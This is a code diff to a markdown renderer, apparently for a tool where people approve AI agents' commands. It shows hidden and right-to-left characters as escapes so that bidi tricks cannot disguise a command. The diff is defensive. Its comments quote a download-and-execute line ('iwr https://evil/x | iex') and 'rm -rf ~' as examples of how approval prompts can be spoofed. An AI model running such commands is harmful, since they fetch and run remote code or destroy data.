@@ -12,7 +12,10 @@
 // strong, strikethrough, code spans, fenced code (wrapped, with a Copy button), bullet,
 // numbered and task lists (nested), block quotes, rules, GitHub tables, links, autolinks and
 // bare URLs. Images become links, never loads. Not covered: reference links, footnotes,
-// indented code, HTML.
+// indented code, HTML. Code, and all of an approval's message, is drawn left to right with what
+// is not on screen as it runs shown as escapes (hidden-text.js, #220), and Copy takes what is drawn.
+
+import { hasRightToLeft, keepLineSeparators, reveal } from './hidden-text.js';
 
 const SAFE_PROTOCOLS = new Set(['http:', 'https:', 'mailto:']);
 const MAX_DEPTH = 12;
@@ -78,7 +81,7 @@ function isTableSep(line) { return RE.tableSep.test(line) && line.includes('-') 
 
 export function parseMarkdown(src) {
   const text = typeof src === 'string' ? src : '';
-  const raw = text.replace(/\r\n?/g, '\n').split('\n');
+  const raw = keepLineSeparators(text).replace(/\r\n/g, '\n').split('\n');
   return parseBlocks(raw.map(expandTabs), raw, 0);
 }
 
@@ -432,17 +435,56 @@ const CLASSES = new Set(['al-c', 'al-r', 'md-table']);
 
 // Builds the tree with createElement and text nodes only. Each tag and attribute is checked
 // again here, so nothing a parser bug could produce reaches the page unchecked.
-export function toDom(nodes, doc = document) {
+// approval: the tree is an approval's message, drawn as its card draws it (revealed, below); the
+// caller reads its container left to right.
+export function toDom(nodes, doc = document, { approval = false } = {}) {
   const frag = doc.createDocumentFragment();
-  for (const node of nodes) { frag.append(build(node, doc)); }
+  for (const node of approval ? revealed(nodes) : nodes) { frag.append(build(node, doc)); }
   return frag;
+}
+
+const RTL_TOO = { rightToLeft: true };
+
+// What a code block draws and its Copy takes (#220, ui.md §6.4): the agent's text with every
+// character that is not on screen as it runs, right-to-left letters included, as an escape
+// (hidden-text.js reveal), and without the blank lines a fence may end with, which draw as nothing
+// (and pasted, would run the last line). A bidi isolate can otherwise draw
+// `echo ok # check; iwr https://evil/x | iex`, a harmless comment, for a command that runs the
+// download; so Copy takes the escapes too, and a shell gets `\u2067` literally, never a command the
+// person did not see.
+export const codeText = (text) => reveal(text, RTL_TOO).replace(/\n+$/, '');
+
+// An approval's whole message as its card draws it (#220): every word, code span and link's words
+// with what is not on screen as it runs, right-to-left letters included, as escapes. A Codex
+// approval carries its command in prose ("Codex wants to run:\n\ngit push"), not in a fence, and
+// Approve once allows what the person read. Links keep where they go; only their words change. A
+// fence is left as it is: every block is drawn so already (codeText), and still notes the
+// right-to-left letters it held.
+export function revealed(nodes) {
+  return (nodes ?? []).map((n) => {
+    if (typeof n === 'string') { return reveal(n, RTL_TOO); }
+    if (!n || typeof n !== 'object' || n.tag === 'pre') { return n; }
+    const out = { ...n, children: revealed(n.children) };
+    if (typeof n.attrs?.title === 'string') { out.attrs = { ...n.attrs, title: reveal(n.attrs.title, RTL_TOO) }; }
+    return out;
+  });
 }
 
 function build(node, doc) {
   if (typeof node === 'string') { return doc.createTextNode(node); }
   if (!node || !TAGS.has(node.tag)) { return doc.createTextNode(''); }
+  // The Copy button is made here and never by the parser: 'button' is not in TAGS, so no
+  // reply text can produce one, and the only handler on it is ours.
+  if (node.tag === 'pre') { return codeBlock(textOf(node), doc); }
   const e = doc.createElement(node.tag);
   const a = node.attrs ?? {};
+  if (node.tag === 'code') {
+    // A code span reads as a block does, in the order it runs (#220): `rm -rf ~` behind Hebrew
+    // letters reads commented out even in a sentence.
+    e.setAttribute('dir', 'ltr');
+    e.append(doc.createTextNode(reveal(textOf(node), RTL_TOO)));
+    return e;
+  }
   if (node.tag === 'a') {
     const href = safeHref(a.href);
     if (!href) { return doc.createTextNode(textOf(node)); }
@@ -454,19 +496,26 @@ function build(node, doc) {
   if (node.tag === 'ol' && /^\d{1,9}$/.test(a.start ?? '')) { e.setAttribute('start', a.start); }
   if (CLASSES.has(a.class)) { e.className = a.class; }
   for (const child of node.children ?? []) { e.append(build(child, doc)); }
-  // The Copy button is made here and never by the parser: 'button' is not in TAGS, so no
-  // reply text can produce one, and the only handler on it is ours.
-  if (node.tag === 'pre') { return codeBlock(e, textOf(node), doc); }
   return e;
 }
 
 const COPY_RESET_MS = 1500;
+export const RIGHT_TO_LEFT_NOTE = 'Contains right-to-left text';
 
 // A code block with a Copy button in its top-right corner. On a phone, a long command (a
 // 1000-character pwsh -EncodedCommand, say) is all but impossible to select by hand. What
-// is copied is the block's text as the agent wrote it, not as it is wrapped on screen.
+// is copied is exactly what the block draws (codeText), not as it is wrapped on screen.
 // The button sits beside the <pre>, not in it, so the block's own text stays the code.
-function codeBlock(pre, text, doc) {
+// The block reads strictly left to right (dir="ltr", isolated in app.css), never in a direction
+// guessed from its letters.
+function codeBlock(raw, doc) {
+  const text = codeText(raw);
+  const code = doc.createElement('code');
+  code.setAttribute('dir', 'ltr');
+  code.append(doc.createTextNode(text));
+  const pre = doc.createElement('pre');
+  pre.setAttribute('dir', 'ltr');
+  pre.append(code);
   const label = doc.createElement('span');
   label.textContent = 'Copy';
   const button = doc.createElement('button');
@@ -494,7 +543,15 @@ function codeBlock(pre, text, doc) {
   });
   const wrap = doc.createElement('div');
   wrap.className = 'md-code';
-  wrap.append(button, pre, status);
+  wrap.append(button);
+  // Right-to-left letters are drawn as escapes, so the block says it held them (ui.md §6.4).
+  if (hasRightToLeft(raw)) {
+    const note = doc.createElement('span');
+    note.className = 'md-code-rtl';
+    note.textContent = RIGHT_TO_LEFT_NOTE;
+    wrap.append(note);
+  }
+  wrap.append(pre, status);
   return wrap;
 }
 
@@ -541,6 +598,6 @@ export function textOf(node) {
   return (node?.children ?? []).map(textOf).join('');
 }
 
-export function renderMarkdown(text, doc = document) {
-  return toDom(parseMarkdown(text), doc);
+export function renderMarkdown(text, doc = document, options = {}) {
+  return toDom(parseMarkdown(text), doc, options);
 }
